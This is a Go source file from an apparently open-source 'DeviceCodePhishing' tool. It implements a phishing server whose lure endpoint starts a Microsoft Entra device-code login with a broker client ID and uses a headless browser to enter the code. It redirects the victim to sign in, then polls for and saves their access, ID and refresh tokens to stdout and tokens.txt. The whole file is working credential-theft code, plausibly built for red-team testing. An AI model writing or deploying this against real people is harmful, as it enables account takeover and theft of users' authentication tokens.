package cmd

import (
	"fmt"
	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

const MsAuthenticationBroker string = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
const DefaultTenant string = "common"

var (
	address    string
	userAgent  string
	clientId   string
	tenant     string
	certFile   string
	keyFile    string
	lurePath   string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", "0.0.0.0:443", "Provide the servers listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent used by HeadlessBrowser & API calls")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
	runCmd.Flags().StringVar(&certFile, "cert", "", "Path to TLS certificate file")
	runCmd.Flags().StringVar(&keyFile, "key", "", "Path to TLS private key file")
	runCmd.Flags().StringVarP(&lurePath, "lure-path", "l", "/lure", "Path for the lure endpoint")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long:  "Starts the phishing server. Listens by default on all interfaces port 443",
	Run: func(cmd *cobra.Command, args []string) {
		// Ensure lurePath starts with /
		if !strings.HasPrefix(lurePath, "/") {
			lurePath = "/" + lurePath
		}

		// Set up a resource handler
		http.HandleFunc(lurePath, lureHandler)

		// Create a Server instance
		server := &http.Server{
			Addr: address,
		}

		slog.Info("Start Server using Tenant:" + tenant + " ClientId:" + clientId)
		
		// Create an IPv4 listener
		ln, err := net.Listen("tcp4", address)
		if err != nil {
			log.Fatal(err)
		}
		
		// Check if TLS certificates are provided
		if certFile != "" && keyFile != "" {
			slog.Info(fmt.Sprintf("Server listening with TLS on %s%s", getListeningURL(address, true), lurePath))
			log.Fatal(server.ServeTLS(ln, certFile, keyFile))
		} else {
			slog.Info(fmt.Sprintf("Server listening on %s%s", getListeningURL(address, false), lurePath))
			slog.Warn("Running without TLS! For HTTPS, provide --cert and --key flags")
			log.Fatal(server.Serve(ln))
		}
	},
}

// getListeningURL returns the full URL based on the address
func getListeningURL(addr string, isTLS bool) string {
	protocol := "http://"
	if isTLS {
		protocol = "https://"
	}
	
	// If address starts with :, it means all interfaces
	if addr[0] == ':' {
		return protocol + "*" + addr
	}
	return protocol + addr
}

func lureHandler(w http.ResponseWriter, r *http.Request) {
	slog.Info("Lure opened...")

	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

	scopes := []string{"openid", "profile", "offline_access"}
	deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
	if err != nil {
		slog.Error("Error during starting device code flow:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
	if err != nil {
		slog.Error("Error during headless browser automation:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	go startPollForToken(tenant, clientId, deviceAuth)
	http.Redirect(w, r, redirectUri, http.StatusFound)
}

func writeTokenToFile(userCode string, tokenType string, token string) error {
	f, err := os.OpenFile("tokens.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("error opening tokens file: %v", err)
	}
	defer f.Close()

	timestamp := time.Now().UTC().Format(time.RFC3339Nano)
	logLine := fmt.Sprintf("time=%s level=INFO msg=\"%s for %s: %s\"\n", timestamp, tokenType, userCode, token)
	
	if _, err := f.WriteString(logLine); err != nil {
		return fmt.Errorf("error writing to tokens file: %v", err)
	}
	return nil
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
	slog.Info("Started polling for token: " + deviceAuth.UserCode)

	for {
		time.Sleep(pollInterval)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error(`"%#v"`, err)
			return
		}

		if result != nil {
			// Log to stdout
			slog.Info("AccessToken for " + deviceAuth.UserCode + ": " + result.AccessToken)
			slog.Info("IdToken for " + deviceAuth.UserCode + ": " + result.IdToken)
			slog.Info("RefreshToken for " + deviceAuth.UserCode + ": " + result.RefreshToken)

			// Write to file
			if err := writeTokenToFile(deviceAuth.UserCode, "AccessToken", result.AccessToken); err != nil {
				slog.Error("Failed to write access token to file:", err)
			}
			if err := writeTokenToFile(deviceAuth.UserCode, "IdToken", result.IdToken); err != nil {
				slog.Error("Failed to write ID token to file:", err)
			}
			if err := writeTokenToFile(deviceAuth.UserCode, "RefreshToken", result.RefreshToken); err != nil {
				slog.Error("Failed to write refresh token to file:", err)
			}
			return
		}
	}
}
